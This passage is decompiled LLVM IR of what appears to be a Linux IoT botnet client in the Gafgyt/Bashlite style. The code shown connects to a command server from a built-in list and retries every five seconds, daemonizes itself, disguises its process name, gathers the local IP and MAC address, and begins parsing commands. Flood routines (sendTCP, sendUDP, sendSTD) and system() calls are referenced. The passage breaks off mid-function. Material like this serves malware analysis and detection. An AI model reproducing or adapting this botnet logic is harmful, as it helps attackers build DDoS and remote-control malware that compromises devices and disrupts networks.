  uselistorder i32 %v1_21158, { 1, 0 }
  uselistorder i32 %v2_21140, { 1, 0, 3, 2 }
  uselistorder i32 %v1_210b0, { 1, 0 }
  uselistorder i32 %v1_21090, { 1, 0 }
  uselistorder i32 %v1_21070, { 1, 0 }
  uselistorder i32 %v1_21050, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 6, 7, 8, 9, 10, 5, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 1, 2, 3, 4, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_38ccc.2896 to i32), { 3, 4, 2, 5, 1, 6, 0, 7, 8, 9 }
  uselistorder i32 (i32, i32)* @kill, { 1, 0 }
  uselistorder i32* @global_var_4998c.2962, { 0, 2, 1, 3 }
  uselistorder i32 51, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 50, { 1, 0, 3, 2 }
  uselistorder i32 49, { 0, 2, 1 }
  uselistorder i32 (i32)* @__libc_system, { 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_325f0.63 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_21a30, { 31, 7, 6, 0, 9, 10, 11, 12, 13, 14, 5, 1, 15, 16, 4, 17, 3, 2, 18, 19, 20, 21, 22, 23, 24, 26, 8, 25, 27, 28, 29, 30 }
  uselistorder label %dec_label_pc_219b4, { 1, 0 }
  uselistorder label %dec_label_pc_219a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_21924, { 1, 0 }
  uselistorder label %dec_label_pc_218f0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_21888, { 1, 0 }
  uselistorder label %dec_label_pc_21844, { 1, 0 }
  uselistorder label %dec_label_pc_21804, { 1, 0 }
  uselistorder label %dec_label_pc_217cc, { 1, 0 }
  uselistorder label %dec_label_pc_21728, { 1, 0 }
  uselistorder label %dec_label_pc_21620, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_215d4, { 1, 0 }
  uselistorder label %dec_label_pc_215ac, { 1, 0 }
  uselistorder label %dec_label_pc_214bc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_213e8, { 1, 0 }
  uselistorder label %dec_label_pc_21338, { 1, 0 }
  uselistorder label %dec_label_pc_212c4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_21264, { 1, 0 }
  uselistorder label %dec_label_pc_21228, { 1, 0 }
  uselistorder label %dec_label_pc_211e8, { 1, 0 }
  uselistorder label %dec_label_pc_21138, { 1, 0 }
  uselistorder label %dec_label_pc_21014, { 2, 0, 1 }
  uselistorder label %dec_label_pc_20fa0, { 1, 0 }
  uselistorder label %dec_label_pc_20ef4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_20ea4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_20e50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_20e10, { 1, 0 }
  uselistorder label %dec_label_pc_20dd0, { 1, 0 }
  uselistorder label %dec_label_pc_20d90, { 1, 0 }
  uselistorder label %dec_label_pc_20d50, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_21ae0 = load i32, i32* @fp, align 4
  store i32 137960, i32* %stack_var_-4, align 4
  %v2_21ae4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_21ae4, i32* @fp, align 4
  %v2_21af8 = ptrtoint i32* %stack_var_-4116 to i32
  %v3_21b08 = bitcast i32* %stack_var_-4116 to i8*
  %v4_21b08 = call i32 @__GI_memset(i8* %v3_21b08, i32 0, i32 4096)
  %v2_21b10 = load i32, i32* @global_var_42c60.61, align 4
  %v2_21b14 = icmp eq i32 %v2_21b10, 0
  br i1 %v2_21b14, label %dec_label_pc_21b38, label %dec_label_pc_21b1c

dec_label_pc_21b1c:                               ; preds = %entry
  %v1_21b28 = call i32 @__GI___libc_close(i32 %v2_21b10)
  store i32 0, i32* @global_var_42c60.61, align 4
  br label %dec_label_pc_21b38

dec_label_pc_21b38:                               ; preds = %entry, %dec_label_pc_21b1c
  %v2_21b3c = load i32, i32* @global_var_42a28.2984, align 4
  %v2_21b40 = icmp eq i32 %v2_21b3c, 0
  br i1 %v2_21b40, label %dec_label_pc_21b6c, label %dec_label_pc_21b58

dec_label_pc_21b58:                               ; preds = %dec_label_pc_21b38
  %v1_21b60 = add i32 %v2_21b3c, 1
  br label %dec_label_pc_21b6c

dec_label_pc_21b6c:                               ; preds = %dec_label_pc_21b38, %dec_label_pc_21b58
  %storemerge1 = phi i32 [ %v1_21b60, %dec_label_pc_21b58 ], [ 0, %dec_label_pc_21b38 ]
  store i32 %storemerge1, i32* @global_var_42a28.2984, align 4
  %v4_21b84 = mul i32 %storemerge1, 4
  %v5_21b84 = add i32 %v4_21b84, ptrtoint ([18 x i8]** @global_var_42990.2987 to i32)
  %v6_21b84 = inttoptr i32 %v5_21b84 to i32*
  %v7_21b84 = load i32, i32* %v6_21b84, align 4
  store i32 %v7_21b84, i32* @r1, align 4
  %v3_21b90 = call i32 @strcpy(i8* %v3_21b08, i32 %v7_21b84)
  store i32 %v2_21af8, i32* @r0, align 4
  %v2_21bb0 = call i32 @__GI_strchr(i32 %v2_21af8, i32 58)
  %v2_21bb8 = icmp eq i32 %v2_21bb0, 0
  br i1 %v2_21bb8, label %dec_label_pc_21c18, label %dec_label_pc_21bc0

dec_label_pc_21bc0:                               ; preds = %dec_label_pc_21b6c
  store i32 %v2_21af8, i32* @r0, align 4
  %v2_21bd4 = call i32 @__GI_strchr(i32 %v2_21af8, i32 58)
  %v1_21bdc = add i32 %v2_21bd4, 1
  store i32 %v1_21bdc, i32* @r0, align 4
  %v1_21be4 = call i32 @atol(i32 %v1_21bdc)
  store i32 %v2_21af8, i32* @r0, align 4
  %v2_21c04 = call i32 @__GI_strchr(i32 %v2_21af8, i32 58)
  %v3_21c14 = inttoptr i32 %v2_21c04 to i8*
  store i8 0, i8* %v3_21c14, align 1
  br label %dec_label_pc_21c18

dec_label_pc_21c18:                               ; preds = %dec_label_pc_21b6c, %dec_label_pc_21bc0
  %stack_var_-20.0 = phi i32 [ ptrtoint (i32* @global_var_42994.2989 to i32), %dec_label_pc_21b6c ], [ %v1_21be4, %dec_label_pc_21bc0 ]
  %v3_21c24 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_21c24, i32* @global_var_42c60.61, align 4
  %v4_21c58 = call i32 @connectTimeout(i32 %v3_21c24, i32 %v2_21af8, i32 %stack_var_-20.0, i32 30)
  %v2_21c60 = icmp eq i32 %v4_21c58, 0
  %. = zext i1 %v2_21c60 to i32
  store i32 %v3_21ae0, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_21af8, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_21c18, { 1, 0 }
  uselistorder label %dec_label_pc_21b6c, { 1, 0 }
  uselistorder label %dec_label_pc_21b38, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_21cb0 = load i32, i32* @fp, align 4
  store i32 %v3_21cb0, i32* %stack_var_-16, align 4
  %v3_21ccc = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_21cdc = icmp eq i32 %v3_21ccc, -1
  br i1 %v3_21cdc, label %dec_label_pc_21ce4, label %dec_label_pc_21cf4

dec_label_pc_21ce4:                               ; preds = %entry
  br label %dec_label_pc_21f30

dec_label_pc_21cf4:                               ; preds = %entry
  %v2_21cf4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_21d04 = bitcast i32* %stack_var_-52 to i8*
  %v4_21d04 = call i32 @__GI_memset(i8* %v3_21d04, i32 0, i32 16)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_38f0c.2991 to i32), i32* @r0, align 4
  %v2_21d14 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_38f0c.2991 to i32))
  %v1_21d24 = call i32 @__GI_htons(i32 53)
  %v3_21d40 = call i32 @__libc_connect(i32 %v3_21ccc, i32 %v2_21cf4, i32 16)
  %v3_21d50 = icmp eq i32 %v3_21d40, -1
  br i1 %v3_21d50, label %dec_label_pc_21d58, label %dec_label_pc_21d68

dec_label_pc_21d58:                               ; preds = %dec_label_pc_21cf4
  br label %dec_label_pc_21f30

dec_label_pc_21d68:                               ; preds = %dec_label_pc_21cf4
  store i32 16, i32* %stack_var_-72, align 4
  %v2_21d70 = ptrtoint i32* %stack_var_-68 to i32
  %v2_21d74 = ptrtoint i32* %stack_var_-72 to i32
  %v5_21d80 = call i32 @__GI_getsockname(i32 %v3_21ccc, i32 %v2_21d70, i32 %v2_21d74, i32 %v2_21d70, i32 16)
  %v3_21d90 = icmp eq i32 %v5_21d80, -1
  br i1 %v3_21d90, label %dec_label_pc_21d98, label %dec_label_pc_21da8

dec_label_pc_21d98:                               ; preds = %dec_label_pc_21d68
  br label %dec_label_pc_21f30

dec_label_pc_21da8:                               ; preds = %dec_label_pc_21d68
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_49980.2631 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_49980.2631, align 4
  %v3_21dbc = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_38f14.2994 to i32), i32 0)
  %v2_21e54 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_21e4c

dec_label_pc_21dcc:                               ; preds = %dec_label_pc_21e4c
  %v4_21de0 = call i32 @strstr(i32 %v2_21e54, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_38f24.2996, i32 0, i32 0))
  %v2_21de8 = icmp eq i32 %v4_21de0, 0
  br i1 %v2_21de8, label %dec_label_pc_21e30, label %dec_label_pc_21e10.preheader

dec_label_pc_21e10.preheader:                     ; preds = %dec_label_pc_21dcc
  %v2_21e149 = load i8, i8* %stack_var_-4168, align 1
  %v7_21e1813 = icmp eq i8 %v2_21e149, 9
  br i1 %v7_21e1813, label %dec_label_pc_21e20, label %dec_label_pc_21e04

dec_label_pc_21e04:                               ; preds = %dec_label_pc_21e10.preheader, %dec_label_pc_21e04
  %v4_21e1014 = phi i32 [ %v1_21e08, %dec_label_pc_21e04 ], [ %v2_21e54, %dec_label_pc_21e10.preheader ]
  %v1_21e08 = add i32 %v4_21e1014, 1
  %v5_21e0c = inttoptr i32 %v1_21e08 to i8*
  %v2_21e14 = load i8, i8* %v5_21e0c, align 1
  %v7_21e18 = icmp eq i8 %v2_21e14, 9
  br i1 %v7_21e18, label %dec_label_pc_21e20, label %dec_label_pc_21e04

dec_label_pc_21e20:                               ; preds = %dec_label_pc_21e04, %dec_label_pc_21e10.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_21e10.preheader ], [ %v5_21e0c, %dec_label_pc_21e04 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_21e74

dec_label_pc_21e30:                               ; preds = %dec_label_pc_21dcc
  %v4_21e48 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0, i32 4096)
  br label %dec_label_pc_21e4c

dec_label_pc_21e4c:                               ; preds = %dec_label_pc_21da8, %dec_label_pc_21e30
  %v4_21e64 = call i32 @fdgets(i32 %v2_21e54, i32 4096, i32 %v3_21dbc, i32 %v2_21e54)
  %v2_21e6c = icmp eq i32 %v4_21e64, 0
  br i1 %v2_21e6c, label %dec_label_pc_21e74, label %dec_label_pc_21dcc

dec_label_pc_21e74:                               ; preds = %dec_label_pc_21e4c, %dec_label_pc_21e20
  %v1_21e78 = call i32 @__GI___libc_close(i32 %v3_21dbc)
  %v4_21e88 = load i8, i8* %stack_var_-4168, align 1
  %v2_21e8c = icmp eq i8 %v4_21e88, 0
  br i1 %v2_21e8c, label %dec_label_pc_21f24, label %dec_label_pc_21e94

dec_label_pc_21e94:                               ; preds = %dec_label_pc_21e74
  %v2_21e9c = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_21e54, i32* @r1, align 4
  %v2_21eb4 = bitcast i32* %stack_var_-4200 to i8*
  %v3_21eb4 = call i32 @strcpy(i8* %v2_21eb4, i32 %v2_21e54)
  store i32 %v2_21e9c, i32* @r3, align 4
  %v3_21ed4 = call i32 @ioctl(i32 %v3_21ccc, i32 35111, i32 %v2_21e9c)
  %v2_21ef4 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_21ee4

dec_label_pc_21ee4:                               ; preds = %dec_label_pc_21e94, %dec_label_pc_21ee4
  %storemerge47 = phi i32 [ 0, %dec_label_pc_21e94 ], [ %v1_21f10, %dec_label_pc_21ee4 ]
  %v2_21efc = add i32 %storemerge47, %v2_21ef4
  %v1_21f00 = inttoptr i32 %v2_21efc to i8*
  %v2_21f00 = load i8, i8* %v1_21f00, align 1
  %v4_21f08 = add i32 %storemerge47, ptrtoint (i32* @global_var_42c70.2998 to i32)
  %v5_21f08 = inttoptr i32 %v4_21f08 to i8*
  store i8 %v2_21f00, i8* %v5_21f08, align 1
  %v1_21f10 = add nuw nsw i32 %storemerge47, 1
  %v7_21f20 = icmp slt i32 %v1_21f10, 6
  br i1 %v7_21f20, label %dec_label_pc_21ee4, label %dec_label_pc_21f24

dec_label_pc_21f24:                               ; preds = %dec_label_pc_21ee4, %dec_label_pc_21e74
  %v1_21f28 = call i32 @__GI___libc_close(i32 %v3_21ccc)
  %v3_21f44.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_21f40

dec_label_pc_21f30:                               ; preds = %dec_label_pc_21d98, %dec_label_pc_21d58, %dec_label_pc_21ce4
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_21f40

dec_label_pc_21f40:                               ; preds = %dec_label_pc_21f24, %dec_label_pc_21f30
  %v3_21f44 = phi i32 [ %v3_21f44.pre, %dec_label_pc_21f24 ], [ 0, %dec_label_pc_21f30 ]
  %v2_21f4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_21f4c, i32* @fp, align 4
  ret i32 %v3_21f44

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_21e08, { 1, 0 }
  uselistorder i32 %v2_21e54, { 2, 1, 3, 5, 0, 4 }
  uselistorder i32 %v3_21ccc, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_htons, { 10, 9, 8, 7, 6, 5, 4, 3, 11, 2, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 1, 0 }
  uselistorder label %dec_label_pc_21f40, { 1, 0 }
  uselistorder label %dec_label_pc_21ee4, { 1, 0 }
  uselistorder label %dec_label_pc_21e4c, { 1, 0 }
  uselistorder label %dec_label_pc_21e04, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v3_21f80 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_38f30.3000 to i32), i32 0)
  %v7_21f88 = icmp eq i32 %v3_21f80, -1
  %v4_21fa4 = select i1 %v7_21f88, i32 ptrtoint ([7 x i8]* @global_var_38f48.3004 to i32), i32 ptrtoint ([7 x i8]* @global_var_38f40.3002 to i32)
  ret i32 %v4_21fa4
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-36904 = alloca i32, align 4
  %stack_var_-4228 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_21fc8 = load i32, i32* @r4, align 4
  store i32 %v3_21fc8, i32* %stack_var_-24, align 4
  store i32 139216, i32* %stack_var_-4, align 4
  %v19_21fc8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_21fcc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_21fcc, i32* @fp, align 4
  %v3_22008 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_38f30.3000 to i32), i32 0)
  store i32 %v3_22008, i32* @r0, align 4
  %v7_22010 = icmp eq i32 %v3_22008, -1
  %. = select i1 %v7_22010, i32 ptrtoint ([19 x i8]* @global_var_38f5c.3011 to i32), i32 ptrtoint ([5 x i8]* @global_var_38f54.3009 to i32)
  %v0_2202c = call i32 @geteuid()
  %v2_22034 = icmp eq i32 %v0_2202c, 0
  br i1 %v2_22034, label %dec_label_pc_2203c, label %dec_label_pc_22048

dec_label_pc_2203c:                               ; preds = %entry
  store i32 0, i32* @global_var_42a24.3013, align 4
  br label %dec_label_pc_22048

dec_label_pc_22048:                               ; preds = %entry, %dec_label_pc_2203c
  %v0_22048 = call i32 @getBuild()
  %v0_22054 = call i32 @getBuild()
  store i32 %v0_22054, i32* @r4, align 4
  %v2_22060 = load i32, i32* @global_var_49980.2631, align 4
  store i32 %v2_22060, i32* @r0, align 4
  %v1_22064 = call i32 @__GI_inet_ntoa(i32 %v2_22060)
  %v0_22070 = load i32, i32* @r4, align 4
  %v1_22070 = inttoptr i32 %v0_22070 to i8*
  %v1_22074 = inttoptr i32 %v1_22064 to i8*
  %v9_22078 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_38f70.3016, i32 0, i32 0), i8* %v1_22070, i8* %v1_22074)
  %v1_2208c = bitcast i8** %argv to i32*
  %v2_2208c = load i32, i32* %v1_2208c, align 4
  store i32 %v2_2208c, i32* @r4, align 4
  %v2_220a4 = load i32, i32* %v1_2208c, align 4
  %v1_220a8 = inttoptr i32 %v2_220a4 to i8*
  %v3_220ac = call i32 @strlen(i8* %v1_220a8)
  %v0_220b4 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_38f50.3006 to i32), i32* @r1, align 4
  %v3_220c0 = call i32 @strncpy(i32 %v0_220b4, i32 ptrtoint (i32* @global_var_38f50.3006 to i32), i32 %v3_220ac)
  %v2_220d4 = load i32, i32* %v1_2208c, align 4
  store i32 %v2_220d4, i32* @r0, align 4
  %v2_220e0 = call i32 @sprintf(i32 %v2_220d4, i32 %.)
  %v6_22104 = call i32 @prctl(i32 15, i32 %., i32 0, i32 0, i32 0)
  %v2_2210c = call i32 @__GI_time(i32* null)
  store i32 %v2_2210c, i32* @r4, align 4
  %v0_22114 = call i32 @__getpid()
  %v0_2211c = load i32, i32* @r4, align 4
  %v2_2211c = xor i32 %v0_2211c, %v0_22114
  %v1_22124 = call i32 @srand(i32 %v2_2211c)
  %v2_2212c = call i32 @__GI_time(i32* null)
  store i32 %v2_2212c, i32* @r4, align 4
  %v0_22134 = call i32 @__getpid()
  %v0_2213c = load i32, i32* @r4, align 4
  %v2_2213c = xor i32 %v0_2213c, %v0_22134
  %v1_22144 = call i32 @init_rand(i32 %v2_2213c)
  %v1_22148 = call i32 @getOurIP(i32 %v1_22144)
  %v0_2214c = call i32 @__libc_fork()
  %v2_2215c = icmp eq i32 %v0_2214c, 0
  br i1 %v2_2215c, label %dec_label_pc_2218c, label %dec_label_pc_22180

dec_label_pc_22180:                               ; preds = %dec_label_pc_22048
  %v2_22164 = ptrtoint i32* %stack_var_-92 to i32
  %v3_22174 = call i32 @__libc_waitpid(i32 %v0_2214c, i32 %v2_22164, i32 0)
  %v1_2217c = call i32 @__GI_exit(i32 0)
  store i32 %v1_2217c, i32* @r0, align 4
  br label %dec_label_pc_221ac

dec_label_pc_2218c:                               ; preds = %dec_label_pc_22048
  %v0_2218c = call i32 @__libc_fork()
  store i32 %v0_2218c, i32* @r0, align 4
  %v2_2219c = icmp eq i32 %v0_2218c, 0
  br i1 %v2_2219c, label %dec_label_pc_221ac, label %dec_label_pc_221a4

dec_label_pc_221a4:                               ; preds = %dec_label_pc_2218c
  %v1_221a8 = call i32 @__GI_exit(i32 0)
  store i32 %v1_221a8, i32* @r0, align 4
  br label %dec_label_pc_221ac

dec_label_pc_221ac:                               ; preds = %dec_label_pc_22180, %dec_label_pc_2218c, %dec_label_pc_221a4
  %v0_221ac = call i32 @__GI_setsid()
  %v1_221b4 = call i32 @chdir(i32 ptrtoint (i32* @global_var_38f80.3018 to i32))
  %v2_221c0 = call i32 @bsd_signal(i32 13, i32 1)
  %v2_22a1c = ptrtoint i32* %stack_var_-4228 to i32
  %v4_22a2c = bitcast i32* %stack_var_-4228 to i8*
  %v1_22640 = or i32 %v2_22a1c, 1
  %v5_22644 = inttoptr i32 %v1_22640 to i8*
  %v2_227b0 = ptrtoint i32* %stack_var_-36904 to i32
  %v3_227c4 = bitcast i32* %stack_var_-36904 to i8*
  %v2_229dc = add i32 %v19_21fc8, -108
  br label %dec_label_pc_221c4

dec_label_pc_221c4:                               ; preds = %dec_label_pc_221d4, %dec_label_pc_22a0c, %dec_label_pc_221ac
  %v0_221c4 = call i32 @initConnection()
  %v2_221cc = icmp eq i32 %v0_221c4, 0
  br i1 %v2_221cc, label %dec_label_pc_221e0, label %dec_label_pc_221d4

dec_label_pc_221d4:                               ; preds = %dec_label_pc_221c4
  %v1_221d8 = call i32 @sleep(i32 5)
  br label %dec_label_pc_221c4

dec_label_pc_221e0:                               ; preds = %dec_label_pc_221c4
  %v2_221e4 = load i32, i32* @global_var_42c60.61, align 4
  store i32 %v2_221e4, i32* @r4, align 4
  %v2_221ec = load i32, i32* @global_var_49980.2631, align 4
  store i32 %v2_221ec, i32* @r0, align 4
  %v1_221f0 = call i32 @__GI_inet_ntoa(i32 %v2_221ec)
  store i32 %v1_221f0, i32* @r5, align 4
  %v0_221f8 = call i32 @getBuild()
  %v0_22208 = load i32, i32* @r4, align 4
  %v0_22210 = load i32, i32* @r5, align 4
  store i32 %v0_22210, i32* @r2, align 4
  %v2_22218 = call i32 @HackerPrint(i32 %v0_22208, i32 ptrtoint (i32* @global_var_38f84.3023 to i32))
  br label %dec_label_pc_22a0c

dec_label_pc_2223c:                               ; preds = %dec_label_pc_224f8, %dec_label_pc_2249c
  %v3_22240 = mul i32 %storemerge14, 4
  %v2_2224c = load i32, i32* @global_var_49990.72, align 4
  %v2_22250 = add i32 %v2_2224c, %v3_22240
  %v1_22254 = inttoptr i32 %v2_22250 to i32*
  %v2_22254 = load i32, i32* %v1_22254, align 4
  %v3_22264 = call i32 @__libc_waitpid(i32 %v2_22254, i32 0, i32 1)
  %tmp101 = icmp slt i32 %v3_22264, 1
  br i1 %tmp101, label %dec_label_pc_22490, label %dec_label_pc_222c8

dec_label_pc_22284:                               ; preds = %dec_label_pc_222c8, %dec_label_pc_22324
  %v2_22288 = load i32, i32* @global_var_49990.72, align 4
  %v3_22294 = mul i32 %v1_22278, 4
  %v1_2228c = add i32 %v3_22294, -4
  %v2_22298 = add i32 %v1_2228c, %v2_22288
  %v2_222b0 = add i32 %v2_22288, %v3_22294
  %v1_222b4 = inttoptr i32 %v2_222b0 to i32*
  %v2_222b4 = load i32, i32* %v1_222b4, align 4
  %v2_222b8 = inttoptr i32 %v2_22298 to i32*
  store i32 %v2_222b4, i32* %v2_222b8, align 4
  br label %dec_label_pc_222c8

dec_label_pc_222c8:                               ; preds = %dec_label_pc_2223c, %dec_label_pc_22284
  %v3_22274.sink = phi i32 [ %v1_22278, %dec_label_pc_22284 ], [ %storemerge14, %dec_label_pc_2223c ]
  %v1_22278 = add i32 %v3_22274.sink, 1
  %v2_222e4 = load i32, i32* @global_var_42c68.69, align 4
  %v9_22304 = icmp eq i32 %v2_222e4, 0
  br i1 %v9_22304, label %dec_label_pc_22324, label %dec_label_pc_22284

dec_label_pc_22324:                               ; preds = %dec_label_pc_222c8
  %v5_222e4 = load i32, i32* @global_var_42c6c.70, align 4
  %tmp102 = icmp ugt i32 %v5_222e4, %v1_22278
  br i1 %tmp102, label %dec_label_pc_22284, label %dec_label_pc_2233c

dec_label_pc_2233c:                               ; preds = %dec_label_pc_22324
  %v2_22340 = load i32, i32* @global_var_49990.72, align 4
  %v3_2234c = mul i32 %v1_22278, 4
  %v1_22344 = add i32 %v3_2234c, -4
  %v2_22350 = add i32 %v1_22344, %v2_22340
  %v2_22358 = inttoptr i32 %v2_22350 to i32*
  store i32 0, i32* %v2_22358, align 4
  %v2_22360 = load i32, i32* @global_var_42c68.69, align 4
  %v5_22360 = load i32, i32* @global_var_42c6c.70, align 4
  %v2_2236c = add i32 %v2_22360, -1
  %v3_2236c = icmp ne i32 %v2_22360, 0
  %v3_22370 = add i32 %v5_22360, -1
  %v4_22370 = zext i1 %v3_2236c to i32
  %v5_22370 = add i32 %v3_22370, %v4_22370
  store i32 %v2_2236c, i32* @global_var_42c68.69, align 4
  store i32 %v5_22370, i32* @global_var_42c6c.70, align 4
  %v3_2238c = icmp eq i32 %v2_22360, 0
  %v4_22390 = zext i1 %v3_2238c to i32
  %v5_22390 = add i32 %v5_22370, %v4_22390
  %v3_22394 = udiv i32 %v2_22360, 1073741824
  %v3_22398 = mul i32 %v5_22390, 4
  %v2_2239c = or i32 %v3_22398, %v3_22394
  store i32 %v2_2239c, i32* @r4, align 4
  %v3_223a0 = mul i32 %v2_22360, 4
  %v1_223a8 = call i32 @malloc(i32 %v3_223a0)
  br label %dec_label_pc_22400

dec_label_pc_223c0:                               ; preds = %dec_label_pc_22400, %dec_label_pc_2245c
  %v3_223c4 = mul i32 %storemerge19, 4
  %v2_223d0 = add i32 %v3_223c4, %v1_223a8
  %v2_223e4 = load i32, i32* @global_var_49990.72, align 4
  %v2_223e8 = add i32 %v2_223e4, %v3_223c4
  %v1_223ec = inttoptr i32 %v2_223e8 to i32*
  %v2_223ec = load i32, i32* %v1_223ec, align 4
  %v2_223f0 = inttoptr i32 %v2_223d0 to i32*
  store i32 %v2_223ec, i32* %v2_223f0, align 4
  %v1_223f8 = add i32 %storemerge19, 1
  br label %dec_label_pc_22400

dec_label_pc_22400:                               ; preds = %dec_label_pc_2233c, %dec_label_pc_223c0
  %storemerge19 = phi i32 [ 0, %dec_label_pc_2233c ], [ %v1_223f8, %dec_label_pc_223c0 ]
  %v2_2241c = load i32, i32* @global_var_42c68.69, align 4
  %v9_2243c = icmp eq i32 %v2_2241c, 0
  br i1 %v9_2243c, label %dec_label_pc_2245c, label %dec_label_pc_223c0

dec_label_pc_2245c:                               ; preds = %dec_label_pc_22400
  %v5_2241c = load i32, i32* @global_var_42c6c.70, align 4
  %tmp = icmp ugt i32 %v5_2241c, %storemerge19
  br i1 %tmp, label %dec_label_pc_223c0, label %dec_label_pc_22474

dec_label_pc_22474:                               ; preds = %dec_label_pc_2245c
  %v2_22478 = load i32, i32* @global_var_49990.72, align 4
  store i32 %v2_22478, i32* @r0, align 4
  %v0_22480 = call i32 @free()
  store i32 %v1_223a8, i32* @global_var_49990.72, align 4
  br label %dec_label_pc_22490

dec_label_pc_22490:                               ; preds = %dec_label_pc_2223c, %dec_label_pc_22474
  %v1_22494 = add i32 %storemerge14, 1
  br label %dec_label_pc_2249c

dec_label_pc_2249c:                               ; preds = %dec_label_pc_22a0c, %dec_label_pc_22490
  %storemerge14 = phi i32 [ %v1_22494, %dec_label_pc_22490 ], [ 0, %dec_label_pc_22a0c ]
  %v3_224a4 = ashr i32 %storemerge14, 31
  %v2_224b8 = load i32, i32* @global_var_42c68.69, align 4
  %v5_224b8 = load i32, i32* @global_var_42c6c.70, align 4
  %v3_224d8 = icmp uge i32 %v2_224b8, %v3_224a4
  %v9_224d8 = icmp eq i32 %v2_224b8, %v3_224a4
  %v2_224dc = xor i1 %v9_224d8, true
  %v3_224dc = and i1 %v3_224d8, %v2_224dc
  br i1 %v3_224dc, label %dec_label_pc_2223c, label %dec_label_pc_224e0

dec_label_pc_224e0:                               ; preds = %dec_label_pc_2249c
  br i1 %v9_224d8, label %dec_label_pc_224f8, label %dec_label_pc_22510

dec_label_pc_224f8:                               ; preds = %dec_label_pc_224e0
  %tmp116 = icmp ugt i32 %v5_224b8, %storemerge14
  br i1 %tmp116, label %dec_label_pc_2223c, label %dec_label_pc_22510

dec_label_pc_22510:                               ; preds = %dec_label_pc_224e0, %dec_label_pc_224f8
  %v2_22524 = add i32 %v5_22a2c, %v2_22a1c
  %v3_2252c = inttoptr i32 %v2_22524 to i8*
  store i8 0, i8* %v3_2252c, align 1
  %v2_22540 = call i32 @trim(i8* %v4_22a2c)
  %v4_22558 = call i32 @strstr(i32 %v2_22a1c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_325f0.63, i32 0, i32 0))
  store i32 %v4_22558, i32* @r2, align 4
  %v9_2256c = icmp eq i32 %v4_22558, %v2_22a1c
